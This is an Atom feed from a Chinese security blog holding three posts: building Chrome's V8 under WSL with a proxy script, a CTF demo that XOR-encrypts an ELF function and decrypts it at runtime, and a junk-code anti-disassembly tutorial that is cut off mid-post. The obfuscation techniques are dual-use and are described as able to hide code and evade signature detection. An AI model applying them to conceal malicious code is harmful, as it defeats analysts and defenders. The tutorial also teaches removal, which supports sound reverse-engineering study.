<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K0nashi</title>
  
  
  <link href="http://blog.k0nashi.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.k0nashi.cn/"/>
  <updated>2022-11-02T03:27:01.029Z</updated>
  <id>http://blog.k0nashi.cn/</id>
  
  <author>
    <name>K0nashi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>chrome v8环境配置</title>
    <link href="http://blog.k0nashi.cn/2022/11/02/chrome-v8-env-conf/"/>
    <id>http://blog.k0nashi.cn/2022/11/02/chrome-v8-env-conf/</id>
    <published>2022-11-02T02:59:54.000Z</published>
    <updated>2022-11-02T03:27:01.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="chrome-v8环境配置"><a href="#chrome-v8环境配置" class="headerlink" title="chrome v8环境配置"></a>chrome v8环境配置</h1><p>近期chrome漏洞炒的比较火热，各种比赛也经常出一些V8的题目，于是下决心去研究一下V8。</p><p>目前对V8的了解是：代码量巨大，环境配置巨麻烦，主要涉及C++的pwn的堆漏洞利用知识。</p><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><blockquote><p>windows 10</p><p>wsl2 Ubuntu20.04</p><p>能上google的代理</p></blockquote><h2 id="安装相关依赖"><a href="#安装相关依赖" class="headerlink" title="安装相关依赖"></a>安装相关依赖</h2><blockquote><p>sudo apt install bison cdbs curl flex g++ git python vim pkg-config ninja-build</p></blockquote><h2 id="安装depot-tools"><a href="#安装depot-tools" class="headerlink" title="安装depot_tools"></a>安装depot_tools</h2><p>depot_tools是google开源的一款工具，下载它主要是用于下载V8的源码。</p><p>由于google的东西都由于某些原因非常难下载，导致环境的配置非常麻烦，经常容易出一些奇奇怪怪的错误，所以这边配置一下代理。</p><p>因为本文使用的是wsl，因此在配置代理的时候比较方便，直接在 ~目录下创建sh脚本文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">hostip=$(cat /etc/resolv.conf | grep nameserver | awk &#x27;&#123; print $2 &#125;&#x27;)</span><br><span class="line">wslip=$(hostname -I | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line">port=7890</span><br><span class="line"> </span><br><span class="line">PROXY_HTTP=&quot;http://$&#123;hostip&#125;:$&#123;port&#125;&quot;</span><br><span class="line"> </span><br><span class="line">set_proxy()&#123;</span><br><span class="line">  export http_proxy=&quot;$&#123;PROXY_HTTP&#125;&quot;</span><br><span class="line">  export HTTP_PROXY=&quot;$&#123;PROXY_HTTP&#125;&quot;</span><br><span class="line"> </span><br><span class="line">  export https_proxy=&quot;$&#123;PROXY_HTTP&#125;&quot;</span><br><span class="line">  export HTTPS_proxy=&quot;$&#123;PROXY_HTTP&#125;&quot;</span><br><span class="line"> </span><br><span class="line">  export ALL_PROXY=&quot;$&#123;PROXY_SOCKS5&#125;&quot;</span><br><span class="line">  export all_proxy=$&#123;PROXY_SOCKS5&#125;</span><br><span class="line"> </span><br><span class="line">  git config --global http.https://github.com.proxy $&#123;PROXY_HTTP&#125;</span><br><span class="line">  git config --global https.https://github.com.proxy $&#123;PROXY_HTTP&#125;</span><br><span class="line"> </span><br><span class="line">  echo &quot;Proxy has been opened.&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unset_proxy()&#123;</span><br><span class="line">  unset http_proxy</span><br><span class="line">  unset HTTP_PROXY</span><br><span class="line">  unset https_proxy</span><br><span class="line">  unset HTTPS_PROXY</span><br><span class="line">  unset ALL_PROXY</span><br><span class="line">  unset all_proxy</span><br><span class="line">  git config --global --unset http.https://github.com.proxy</span><br><span class="line">  git config --global --unset https.https://github.com.proxy</span><br><span class="line"> </span><br><span class="line">  echo &quot;Proxy has been closed.&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">test_setting()&#123;</span><br><span class="line">  echo &quot;Host IP:&quot; $&#123;hostip&#125;</span><br><span class="line">  echo &quot;WSL IP:&quot; $&#123;wslip&#125;</span><br><span class="line">  echo &quot;Try to connect to Google...&quot;</span><br><span class="line">  resp=$(curl -I -s --connect-timeout 5 -m 5 -w &quot;%&#123;http_code&#125;&quot; -o /dev/null www.google.com)</span><br><span class="line">  if [ $&#123;resp&#125; = 200 ]; then</span><br><span class="line">    echo &quot;Proxy setup succeeded!&quot;</span><br><span class="line">  else</span><br><span class="line">    echo &quot;Proxy setup failed!&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if [ &quot;$1&quot; = &quot;set&quot; ]</span><br><span class="line">then</span><br><span class="line">  set_proxy</span><br><span class="line"> </span><br><span class="line">elif [ &quot;$1&quot; = &quot;unset&quot; ]</span><br><span class="line">then</span><br><span class="line">  unset_proxy</span><br><span class="line"> </span><br><span class="line">elif [ &quot;$1&quot; = &quot;test&quot; ]</span><br><span class="line">then</span><br><span class="line">  test_setting</span><br><span class="line">else</span><br><span class="line">  echo &quot;Unsupported arguments.&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>使用方法：</p><blockquote><p>source ~/proxy.sh set：开启代理</p><p>source ~/proxy.sh unset：关闭代理</p><p>source ~/proxy.sh test：查看代理状态</p></blockquote><p>脚本第四行里的端口号和第六行的http还是socks5因人而异，具体参考你所使用的魔法工具。</p><p>然后顺便再设置一下git：</p><blockquote><p>git config –global user.email <a href="mailto:&#x78;&#120;&#x78;&#64;&#120;&#x78;&#120;&#x78;&#46;&#99;&#111;&#x6d;">&#x78;&#120;&#x78;&#64;&#120;&#x78;&#120;&#x78;&#46;&#99;&#111;&#x6d;</a></p><p>git config –global user.name xxxx</p><p>git config –global http.postbuffer 1048576000</p></blockquote><p>这里设置git是因为后面会有向git下载的指令，如果git没有设置postbuffer，在下载v8的时候会因为文件没有下载下来而报错。</p><p>配置完代理网络后，用curl测试一下</p><blockquote><p>curl <a href="http://www.google.com/">www.google.com</a></p></blockquote><p>如果回显非空那就配置好了</p><p>正式下载depot_tools</p><blockquote><p> git clone <a href="https://chromium.googlesource.com/chromium/tools/depot_tools.git">https://chromium.googlesource.com/chromium/tools/depot_tools.git</a></p></blockquote><p>将depot_tools加入环境变量</p><blockquote><p>echo “export PATH=$(pwd)/depot_tools:${PATH}” &gt;&gt; ~/.zshrc</p></blockquote><p>然后使用gclient，测试一下depot_tools能否正常更新，如果可以，稍作等待后回显应该是这样的：</p><p><img src="/2022/11/02/chrome-v8-env-conf/1667297089700-b4bd4d28-472c-4733-8af2-d994223baf00.png" alt="img"></p><h2 id="下载v8源码"><a href="#下载v8源码" class="headerlink" title="下载v8源码"></a>下载v8源码</h2><p>新建一个目录，在目录下使用指令</p><blockquote><p>fetch v8</p></blockquote><p>这个指令会将整个v8的源码下载下来，下载的时候确保你有足够的时间，并且网络（代理）足够稳定，否则很容易出奇奇怪怪的问题。</p><p>下载过程如果出错了，再次使用fetch v8会提示你使用另一个指令</p><blockquote><p>gclient sync</p></blockquote><p>同步上一次的下载进度</p><p><img src="/2022/11/02/chrome-v8-env-conf/1667297390196-23921d96-4054-46bd-b5bc-d30f7b487f8f.png" alt="img"></p><p>另外，还有时候会出现一个提示</p><blockquote><p>NOTICE: You have PROXY values set in your environment, but gsutilin depot_tools does not (yet) obey them.</p><p>Also, –no_auth prevents the normal BOTO_CONFIG environmentvariable from being used.</p><p>To use a proxy in this situation, please supply those settingsin a .boto file pointed to by the NO_AUTH_BOTO_CONFIG environmentvariable.</p></blockquote><p>主要意思是depot_tools没有接入代理，只要创建一个~/.boto文件，内容修改为</p><blockquote><p>[Boto]</p><p>debug = 0</p><p>num_retries = 10</p><p>proxy = 127.0.0.1</p><p>proxy_port = 7890</p></blockquote><p>然后将.boto的路径存入环境变量即可。</p><p>如果一路顺利下载完了v8，没有任何报错的话，就可以继续下一步了。</p><h2 id="编译v8"><a href="#编译v8" class="headerlink" title="编译v8"></a>编译v8</h2><p>cd进v8主目录然后执行命令：</p><blockquote><p>gn gen out/x64.release –args=’v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu=”x64” use_goma=false goma_dir=”None” v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true’</p></blockquote><blockquote><p>ninja -C out/x64.release d8</p></blockquote><p>其中gn命令主要是在out路径下生成x64.release目录，ninja指令将x64.release文件打包成一个可执行文件。</p><p>如果gn命令失败了，多半是v8文件下载不完全导致的，我在这里失败了很多次，最后还是重新下了V8解决。</p><p>我在执行ninja命令时，碰到了ninja罢工的问题:</p><blockquote><p>ninja no work to do</p></blockquote><p>经过查找github上的issue，找到了解决办法：</p><blockquote><p>ninja -C out/Release -t clean</p></blockquote><p>然后再执行之前的编译指令即可。</p><p>完成配置</p><p><img src="/2022/11/02/chrome-v8-env-conf/1667357488721-bd642d83-d02c-4e09-9f79-5510fa040e75.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;chrome-v8环境配置&quot;&gt;&lt;a href=&quot;#chrome-v8环境配置&quot; class=&quot;headerlink&quot; title=&quot;chrome v8环境配置&quot;&gt;&lt;/a&gt;chrome v8环境配置&lt;/h1&gt;&lt;p&gt;近期chrome漏洞炒的比较火热，各种比赛也经常出一</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
    <category term="v8" scheme="http://blog.k0nashi.cn/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>一次ELF程序动态解密尝试</title>
    <link href="http://blog.k0nashi.cn/2022/10/11/dynamicDecode/"/>
    <id>http://blog.k0nashi.cn/2022/10/11/dynamicDecode/</id>
    <published>2022-10-11T07:12:54.000Z</published>
    <updated>2022-10-11T07:30:41.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次ELF程序动态解密尝试"><a href="#一次ELF程序动态解密尝试" class="headerlink" title="一次ELF程序动态解密尝试"></a>一次ELF程序动态解密尝试</h1><p>在最近的一次出题中，由于pwn水平有限（泪），所以为了提高难度，在pwn题中添加了一些逆向要素。在最近的一次尝试中实现了之前一直有想法，但没有去实现的一个动态解密的思路，写出本文给大家分享一下。</p><h2 id="0x01-什么是动态解密"><a href="#0x01-什么是动态解密" class="headerlink" title="0x01 什么是动态解密"></a>0x01 什么是动态解密</h2><p>这动态解密其实是我自己取的名字，主要的操作就是让程序在运行过程中对将要执行的代码进行解密，执行完后再加密回去。这样能在很大程度上提高逆向分析的难度。因为当攻击者对程序进行逆向分析时，如果没有解密，它只能看着一块加密的数据发呆。</p><p>大概是这个样子：</p><p><img src="/2022/10/11/dynamicDecode/1665469450131-88e11ad8-3f93-46fa-9f2d-01efe52b0c37.png" alt="img"></p><h2 id="0x02-实现思路"><a href="#0x02-实现思路" class="headerlink" title="0x02 实现思路"></a>0x02 实现思路</h2><ol><li>编写好待加密函数a()；</li><li>编写解密函数b()，在b()函数中先解密a，再用函数指针调用a，调用完毕后再加密回去；</li><li>编译；</li><li>编写脚本（我习惯用py），对编译后的ELF对应地址加密、覆写。</li></ol><p>这里要注意，当程序被编译完以后，是无法执行的，如果执行一定会报错，这是因为此时函数a还并未加密，如果对未加密的字节进行解密，它的效果等同于对该字节进行加密，因此程序会因为碰到不认识的机器码而报错。</p><h2 id="0x03-实际操作"><a href="#0x03-实际操作" class="headerlink" title="0x03 实际操作"></a>0x03 实际操作</h2><h3 id="dynamicDecode-c"><a href="#dynamicDecode-c" class="headerlink" title="dynamicDecode.c"></a>dynamicDecode.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;114514&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *func_a = (<span class="keyword">char</span> *)a;<span class="comment">//func_p of a();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//let a(); writable</span></span><br><span class="line">    mprotect((<span class="keyword">u_int64_t</span>)func_a &amp; ~<span class="number">0xfff</span>,<span class="number">0x1000</span>,PROT_EXEC|PROT_WRITE|PROT_READ);</span><br><span class="line">    <span class="comment">//decode a();</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; (<span class="keyword">int</span>)b - (<span class="keyword">int</span>)a;i++)&#123;</span><br><span class="line">        *(func_a + i) = *(func_a + i) ^ <span class="number">0xfc</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//call a();</span></span><br><span class="line">    (*(<span class="keyword">void</span> (*)())func_a)();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encode a();</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; (<span class="keyword">int</span>)b - (<span class="keyword">int</span>)a;i++)&#123;</span><br><span class="line">        *(func_a + i) = *(func_a + i) ^ <span class="number">0xfc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//let a(); not writable</span></span><br><span class="line">    mprotect((<span class="keyword">u_int64_t</span>)func_a &amp; ~<span class="number">0xfff</span>,<span class="number">0x1000</span>,PROT_EXEC|PROT_READ);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    b();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到程序逻辑不是特别复杂，主要操作就是获取a的指针，给a所在的页写权限，用循环遍历函数a的每个字节，将所有数据逐字节异或一个0xfc，通过函数指针调用，然后再加密回去，关闭写权限。</p><p>最后再main调用b，实际上则是解密a，调用a，加密a。</p><p>当然，前面也提到，这个程序编译完是无法运行的：</p><p><img src="/2022/10/11/dynamicDecode/1665470507847-97c89fd9-cbf1-48d1-a4a3-8fc3aef36381.png" alt="img"></p><p>理由也很简单，gdb进去一看就知道</p><p><img src="/2022/10/11/dynamicDecode/1665470577864-4961f9f6-0c62-4eb2-b82b-dafaf44d2e47.png" alt="img"></p><p>此时的a是一串莫名其妙的东西。</p><p><img src="/2022/10/11/dynamicDecode/1665470603568-85a385fa-774e-42df-beba-b15a7808086b.png" alt="img"></p><p>所以现在要做的是对a函数进行加密。</p><h3 id="获取a的地址"><a href="#获取a的地址" class="headerlink" title="获取a的地址"></a>获取a的地址</h3><p><img src="/2022/10/11/dynamicDecode/1665470919538-790312a0-58e6-41e0-924d-863c0984221b.png" alt="img"></p><p>将elf文件拖入ida，查看a函数的起始地址和结束地址 0x1169和0x117f</p><h3 id="enc-fun-py"><a href="#enc-fun-py" class="headerlink" title="enc_fun.py"></a>enc_fun.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ELF_PATH = <span class="string">r&#x27;./dynamicDecode&#x27;</span></span><br><span class="line">start_addr = <span class="number">0x1169</span></span><br><span class="line">end_addr = <span class="number">0x1180</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read elf with bytes mode</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(ELF_PATH,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    content = fp.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#bytes -&gt; hex string</span></span><br><span class="line">hex_code = content.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#part1</span></span><br><span class="line">new_elf_hex = hex_code[:start_addr * <span class="number">2</span>] </span><br><span class="line"></span><br><span class="line"><span class="comment">#part2 select and encode aim function</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr * <span class="number">2</span>,end_addr * <span class="number">2</span>,<span class="number">2</span>):</span><br><span class="line">    now_byte = <span class="built_in">int</span>(hex_code[i:i+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#? encode now_byte</span></span><br><span class="line">    now_byte = now_byte ^ <span class="number">0xfc</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">hex</span>(now_byte))== <span class="number">3</span>:</span><br><span class="line">        new_byte = <span class="string">&#x27;0&#x27;</span> + <span class="built_in">hex</span>(now_byte)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_byte = <span class="built_in">hex</span>(now_byte)[<span class="number">2</span>:]</span><br><span class="line">    new_elf_hex = new_elf_hex + new_byte</span><br><span class="line"></span><br><span class="line"><span class="comment">#part3</span></span><br><span class="line">new_elf_hex += hex_code[end_addr * <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#hex string -&gt; bytes,write with bytes mod</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(ELF_PATH + <span class="string">&#x27;.encoded&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(<span class="built_in">bytes</span>.fromhex(new_elf_hex))</span><br></pre></td></tr></table></figure><p>此脚本的逻辑很简单，主要是将ELF文件转成hex string处理。这里要注意一点，因为一个地址对应一个字节，而一个字节对应的hex string是两个字符（例如‘A’是0x61，那它的hex string就是“61”），所以所有的地址都需要*2。其他的我批注写的应该还算明白，直接看批注就行了。</p><p>加密后的执行结果：</p><p><img src="/2022/10/11/dynamicDecode/1665471409414-f8a27f89-9576-4ab0-9429-10c128566f3d.png" alt="img"></p><p>在ida中的函数a：</p><p><img src="/2022/10/11/dynamicDecode/1665471584625-d4b7e827-e16b-43bc-bade-fa9e6fe81758.png" alt="img"></p><p>居然还有几个字节能识别成汇编，不过没什么意义。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>此次尝试主要是实现了我之前一直想要去做的一个想法。当然加密方式可以不必要是简单的异或，也可以是RC4，AES，甚至是RSA。如果想的话，也可以直接用内联汇编写解密函数b，这些都能让函数a的解密难度更上一层楼，而函数a可以是整个程序中的任何一个函数，如果你想可以每个函数都套一层这个，这也就提高了整个二进制文件的逆向难度。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次ELF程序动态解密尝试&quot;&gt;&lt;a href=&quot;#一次ELF程序动态解密尝试&quot; class=&quot;headerlink&quot; title=&quot;一次ELF程序动态解密尝试&quot;&gt;&lt;/a&gt;一次ELF程序动态解密尝试&lt;/h1&gt;&lt;p&gt;在最近的一次出题中，由于pwn水平有限（泪），所以为</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="Reverse" scheme="http://blog.k0nashi.cn/tags/Reverse/"/>
    
    <category term="bypass" scheme="http://blog.k0nashi.cn/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>基础花指令&amp;去花指令</title>
    <link href="http://blog.k0nashi.cn/2022/10/11/junkcode/"/>
    <id>http://blog.k0nashi.cn/2022/10/11/junkcode/</id>
    <published>2022-10-11T05:56:08.000Z</published>
    <updated>2022-10-11T07:15:50.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础花指令-amp-去花指令"><a href="#基础花指令-amp-去花指令" class="headerlink" title="基础花指令&amp;去花指令"></a>基础花指令&amp;去花指令</h1><blockquote><p>本文主要作为个人学习记录，主要参考了Captain_RB大佬<a href="https://blog.csdn.net/Captain_RB/article/details/123858864">博客</a>的文案，侵删。</p></blockquote><p>花指令又称脏字节，英文为”junkcode”，顾名思义，即在程序中加入的一些垃圾指令，其目的是在不妨碍原有程序执行的前提下，阻碍程序反编译，增加静态分析难度，隐匿不想被逆向分析的代码块，混淆代码，绕过特征识别。<br><strong>注</strong>：本文使用的反编译器是ida7.7,编译环境：gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)</p><p>以下将按照不同分类介绍一些常见的花指令：</p><h2 id="0x01不可执行花指令"><a href="#0x01不可执行花指令" class="headerlink" title="0x01不可执行花指令"></a>0x01不可执行花指令</h2><p>它是利用反汇编器静态分析算法的缺陷使得代码在反编译解析时出错。其原理使反汇编分析执行流命中执行会出错的垃圾数据，就会造成解析错误，而实际执行过程中垃圾数据并不会执行。</p><h3 id="1-硬编码多字节指令"><a href="#1-硬编码多字节指令" class="headerlink" title="1.硬编码多字节指令"></a>1.硬编码多字节指令</h3><p>最常见的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jz Label        // 采用条件互补的方法跳转绕过垃圾数据</span><br><span class="line">jnz Label</span><br><span class="line">junkcode</span><br><span class="line">Label:</span><br></pre></td></tr></table></figure><p>其中 junkcode 可以是任何的多字节指令的硬编码，我一般的操作是写一个nop然后用hex编辑器将90改为E8。为什么要改为E8：</p><p><img src="/2022/10/11/junkcode/1665456498035-1faeac1a-252f-45bd-871b-dabd3306549d.png" alt="img"></p><p>可以看到X86_64架构下，call指令为E8 + 一个偏移地址，如果把这个junkcode设为E8，反汇编时会自动把后面的机器码识别为偏移地址，出现“吞指令”的现象。</p><p><strong>实践一下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;im here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先写一个简单的C程序，然后再func的puts前，插入内联汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;jz label;&quot;</span></span><br><span class="line">        <span class="string">&quot;jnz label;&quot;</span></span><br><span class="line">        <span class="string">&quot;nop;&quot;</span></span><br><span class="line">        <span class="string">&quot;label:;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;im here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要记得在gcc编译时加入-masm=”intel”否则linux下的内联汇编默认使用AT&amp;T语法。</p><p>此时的反编译和反汇编：</p><p><img src="/2022/10/11/junkcode/1665457071258-7202ae8f-0cf9-4513-b681-1879ebf285f9.png" alt="img"></p><p><img src="/2022/10/11/junkcode/1665457099193-c9248375-4751-4aae-84b8-d43e4532c222.png" alt="img"></p><p>将label上的nop改为E8，输出到ELF后重新用ida打开：</p><p><img src="/2022/10/11/junkcode/1665457209687-1c9049bf-a060-4f10-813b-338cbbce11d7.png" alt="img"></p><p>可以看到main边上已经没有func了</p><p><img src="/2022/10/11/junkcode/1665457237523-2f8b9fb8-c1b8-45c1-b3f6-6d6dc884b739.png" alt="img"></p><p>有时候也会解析成这样：</p><p><img src="/2022/10/11/junkcode/1665457272935-80654d42-9343-4a35-a02b-475eeceea1a6.png" alt="img"></p><p>第二个是我想要的效果，不知道为什么第一个不行，可能是因为后面的指令无法被解析吧。</p><p>总之都达到了混淆反汇编的效果。</p><p><strong>去花：看到这种jz jnz，直接把从第一个跳转jz，一直到跳转目标地址之间直接全nop掉就行了。</strong></p><h3 id="2-破坏堆栈平衡"><a href="#2-破坏堆栈平衡" class="headerlink" title="2.破坏堆栈平衡"></a>2.破坏堆栈平衡</h3><p>如果反编译器检测到指令破坏了堆栈平衡，即函数返回时与调用时堆栈状态发生了变化，就会报错。可以利用这一点构造破坏堆栈平衡的花指令，如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test eax,<span class="number">0</span>         <span class="comment">// 构造必然条件实现跳转，绕过破坏堆栈平衡的指令</span></span><br><span class="line">jz label           </span><br><span class="line">add esp,<span class="number">0x1</span>        </span><br><span class="line">label:</span><br></pre></td></tr></table></figure><p>反汇编效果：</p><p><img src="/2022/10/11/junkcode/1665458455438-81333dad-ac2d-47c4-98a0-82f7c6cf799b.png" alt="img"></p><p>原理主要是由于ida解析时碰到条件判断语句会同时解析两条支路，导致出现两条路的栈不平衡的现象。</p><p>不过这个花指令似乎并没有混淆到高版本的ida：</p><p><img src="/2022/10/11/junkcode/1665458531733-dccd8c82-d886-47fe-8da9-ba9717b15a7f.png" 